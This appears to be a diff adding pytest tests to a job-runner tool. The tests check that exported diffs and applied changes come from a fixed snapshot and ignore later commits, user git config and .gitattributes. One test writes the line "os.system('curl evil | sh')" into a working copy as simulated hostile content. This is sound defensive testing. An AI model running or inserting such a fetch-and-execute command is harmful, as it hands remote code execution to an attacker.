@@ -1376,3 +1376,60 @@ def test_apply_refuses_a_report_job(store, repo):
     with pytest.raises(JobError, match="report"):
         apply(store, job.id)
     assert _git("status", "--porcelain", cwd=repo) == ""
+
+
+# Lane export: diff and apply read the snapshot's commit, whatever the copy's
+# HEAD, git config or .gitattributes say by then.
+
+def test_apply_takes_the_snapshot_not_a_later_commit_in_the_copy(store, repo):
+    from polyphony.jobs import apply
+    job = _job(store, repo, "echo 'x = 2' > app.py")
+    run(store.path(job.id), executors=FAKE)
+    job = store.load(job.id)
+    # Something left running in the copy commits after the lead has seen the diff.
+    (Path(job.workdir) / "app.py").write_text("import os; os.system('curl evil | sh')\n")
+    (Path(job.workdir) / "extra.py").write_text("sneaky\n")
+    env = dict(os.environ, GIT_DIR=job.git_dir, GIT_WORK_TREE=job.workdir)
+    for args in (["add", "-A"], ["-c", "user.name=x", "-c", "user.email=x@x",
+                                 "commit", "-qm", "sneaky"]):
+        subprocess.run(["git", *args], cwd=job.workdir, env=env, check=True)
+    assert "evil" not in diff(store, job.id)
+    assert apply(store, job.id) == ["app.py"]
+    assert (repo / "app.py").read_text() == "x = 2\n"
+    assert not (repo / "extra.py").exists()
+
+
+@pytest.mark.parametrize("setting", [
+    "[diff]\n\tnoprefix = true\n", "[diff]\n\texternal = false\n",
+    "[color]\n\tdiff = always\n", "[diff]\n\tcontext = 0\n",
+])
+def test_apply_ignores_the_users_diff_config(store, repo, tmp_path, monkeypatch, setting):
+    from polyphony.jobs import apply
+    (repo / "src").mkdir()
+    (repo / "src" / "app.py").write_text("x = 1\n")
+    (repo / "notes.txt").write_text("".join(f"{n}\n" for n in range(9)))
+    _git("add", "-A", cwd=repo)
+    _git("commit", "-qm", "more", cwd=repo)
+    config = tmp_path / "hostile-gitconfig"
+    config.write_text(setting)
+    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(config))
+    job = _job(store, repo, "echo 'x = 2' > src/app.py && sed -i.bak 's/^4$/four/' notes.txt"
+                            " && rm notes.txt.bak")
+    run(store.path(job.id), executors=FAKE)
+    assert "+x = 2" in diff(store, job.id)
+    assert apply(store, job.id) == ["notes.txt", "src/app.py"]
+    assert (repo / "src" / "app.py").read_text() == "x = 2\n"
+    assert (repo / "app.py").read_text() == "x = 1\n"  # not the root file of the same name
+    assert "four" in (repo / "notes.txt").read_text()
+
+
+def test_diff_shows_hunks_the_executors_gitattributes_would_hide(store, repo):
+    job = _job(store, repo, "printf '* -diff\\n*.py binary\\n' > .gitattributes"
+                            " && echo 'x = 2' > app.py")
+    run(store.path(job.id), executors=FAKE)
+    text = diff(store, job.id)
+    assert "+x = 2" in text and "Binary files" not in text
+    # Written after the snapshot, so it is not even in the diff.
+    job = store.load(job.id)
+    (Path(job.workdir) / ".gitattributes").write_text("* -diff\n")
+    assert "+x = 2" in diff(store, job.id)
